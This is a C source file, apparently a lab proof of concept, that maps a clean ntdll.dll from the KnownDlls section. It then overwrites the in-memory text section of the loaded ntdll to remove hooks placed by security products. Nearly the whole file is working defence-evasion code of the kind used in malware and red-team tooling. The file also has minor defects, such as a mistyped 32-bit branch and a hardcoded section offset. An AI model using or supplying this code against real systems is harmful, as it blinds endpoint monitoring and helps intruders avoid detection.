#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "structs.h"
/*
Map ntdll.dll from disk into the current process and then use it to overwrite the hooked text section of the
existing ntdll.dll
*/
#define NTDLL L"\\KnownDlls\\ntdll.dll"
#define OBJ_CASE_INSENSITIVE 0x00000040L
#define SUCCESS 0x00


BOOL MapFromDisk(OUT PVOID* ppntdllBuff) {
    HANDLE hFile = NULL, 
        hSection = NULL;
    CHAR winPath[MAX_PATH / 2] = { 0 };
    CHAR NtdllPath[MAX_PATH] = { 0 };
    PBYTE NtdllBuffer = NULL;

    if (GetWindowsDirectoryA(winPath, sizeof(winPath)) == 0) {
        printf("Getting windows directory failed: %d\n", GetLastError());
        goto _Cleanup;
    }

    //Construct the path
    sprintf_s(NtdllPath, sizeof(NtdllPath), "%s\\System32\\NTDLL.DLL", winPath);

    //Getting a handle to the file
    hFile = CreateFileA(NtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == NULL) {
        printf("Open file failed: %d\n", GetLastError());
        goto _Cleanup;
    }

    //Create a mapping view of ntdll.dll with SEC_IMAGE_NO_EXECUTE flag
    hSection = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE_NO_EXECUTE, NULL, NULL, NULL);
    if (hSection == NULL) {
        printf("File mapping creation failed: %d\n", GetLastError());
        goto _Cleanup;
    }

    //mapping the view of file
    NtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
    if (NtdllBuffer == NULL) {
        printf("Mapping failed: %d\n", GetLastError());
        goto _Cleanup;
    }

    printf("Mapped ntdll.dll address: 0x%p\n", NtdllBuffer);
    *ppntdllBuff = NtdllBuffer;
    return TRUE;

_Cleanup:
    if (hFile) {
        CloseHandle(hFile);
    }
    if (hSection) {
        CloseHandle(hSection);
    }
    return FALSE;
}

//NtOpenSection to open a handle on the ntdll from knownDlls's registry key
BOOL MapFromKnownDLLs(PVOID* ppNtdllBuff) {
    HANDLE hSection = NULL;
    PBYTE pNtdllBuffer = NULL;
    NTSTATUS status = NULL;
    UNICODE_STRING uString = { 0 };
    OBJECT_ATTRIBUTES objAttr = { 0 };

    //populate the unicode string that will hold ntdll info
    uString.Buffer = (PWSTR)NTDLL;
    uString.Length = wcslen(NTDLL) * sizeof(WCHAR);
    uString.MaximumLength = uString.Length + sizeof(WCHAR);

    //init object attributes
    InitializeObjectAttributes(&objAttr, &uString, OBJ_CASE_INSENSITIVE, NULL, NULL);

    fnNtOpenSection pNtOpenSection = (fnNtOpenSection)(GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtOpenSection"));

    //Get a handle on ntdll
    status = pNtOpenSection(&hSection, SECTION_MAP_READ, &objAttr);
    if (status != SUCCESS) {
        printf("NtOpenSection failed: 0x%X\n", status);
        goto _Cleanup;
    }

    //Map the section
    pNtdllBuffer = MapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
    if (pNtdllBuffer == NULL) {
        printf("Section mapping failed: %d\n", GetLastError());
        goto _Cleanup;
    }

    printf("Mapped ntdll.dll address: 0x%p\n", pNtdllBuffer);
    *ppNtdllBuff = pNtdllBuffer;
    return TRUE;


_Cleanup:
    if (hSection) {
        CloseHandle(hSection);
    }
    *ppNtdllBuff = NULL;
    return FALSE;
}


typedef struct _NtdllInfo {
    PVOID ntdllTextBase;
    SIZE_T ntdllTextSize;
} NtdllInfo, *PNtdllInfo ;

//Fetch the local ntdll handle
BOOL FetchLocal(IN PNtdllInfo ntdllInf) {
    PVOID ntdllBase = NULL,
        ntdllTextBase = NULL;
    SIZE_T ntdllTextSize = 0;


#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEN pPen = (PPEB)__readfsdword(0x30);
#endif
    //Reaching to the 'ntdll.dll' module directly (we know its the 2nd image after the local image name)
    //The size of the LIST_ENTRY structure is 0x10, therefore 0x10 is subtracted to move the pointer 
    // to the beginning of the second entry, which is the position of ntdll.dll
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

    ntdllBase =  pLdr->DllBase;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((PBYTE)ntdllBase + dosHeader->e_lfanew);
    if (ntHeader->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    printf("Original ntdll.dll address: 0x%p\n", ntdllBase);

    ntdllInf->ntdllTextBase = (PVOID)(ntHeader->OptionalHeader.BaseOfCode + (ULONG_PTR)ntdllBase);
    ntdllInf->ntdllTextSize = ntHeader->OptionalHeader.SizeOfCode;
    return TRUE;
}


BOOL ReplaceTextSct(IN NtdllInfo ntdllInf, PVOID unhookedNtdll) {
    PVOID unhookedText = (ULONG_PTR)unhookedNtdll + 4096;
    
    printf("Original ntdll.dll text address: 0x%p\n", ntdllInf.ntdllTextBase);
    getchar();
    DWORD old = 0;
    if (!VirtualProtect(ntdllInf.ntdllTextBase, ntdllInf.ntdllTextSize, PAGE_EXECUTE_WRITECOPY, &old)) {
        printf("Virtual protect failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("Press ENTER to overwrite ntdll.dll text section\n");
    getchar();

    memcpy(ntdllInf.ntdllTextBase, unhookedText, ntdllInf.ntdllTextSize);
    if (!VirtualProtect(ntdllInf.ntdllTextBase, ntdllInf.ntdllTextSize, old, &old)) {
        printf("Virtual protect2 failed: %d\n", GetLastError());
        return FALSE;
    }

    printf("Replaced the hooked text section, ENTER to continue\n");
    getchar();
    return TRUE;
}




int main()
{
    printf("Starting\n");
    PVOID ntdllBuff = NULL;
    NtdllInfo ntdllInf = { 0 };

    /*
    printf("Getting fresh copy of ntdll\n");
    if (!MapFromDisk(&ntdllBuff)) {
        printf("Failed mapping fresh ntdll\n");
        return 1;
    }
    */

    printf("Getting fresh copy of ntdll\n");
    if (!MapFromKnownDLLs(&ntdllBuff)) {
        printf("Failed mapping fresh ntdll\n");
        return 1;
    }

    printf("Reading the local ntdll\n");
    if (!FetchLocal(&ntdllInf)) {
        printf("Failed reading hooked ntdll\n");
        return 1;
    }


    if (!ReplaceTextSct(ntdllInf, ntdllBuff)) {
        printf("Failed replacing text section\n");
        return 1;
    }

    printf("Done!\n");
    return 0;
}
